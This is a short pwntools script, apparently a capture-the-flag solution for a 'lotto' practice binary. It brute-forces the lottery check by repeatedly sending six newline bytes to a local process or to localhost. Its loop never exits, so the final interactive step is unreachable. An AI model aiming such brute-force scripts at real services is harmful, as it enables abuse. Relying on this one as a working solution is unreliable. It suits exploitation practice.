from pwn import *

exe = ELF('lotto', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                raw_input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('localhost', 1337)
else:
        p = process(exe.path)

# GDB()
while True:
        sla("Exit\n", str(1))
        sa("bytes : ", "\x0a\x0a\x0a\x0a\x0a\x0a")
        p.recvuntil("luck...")

p.interactive()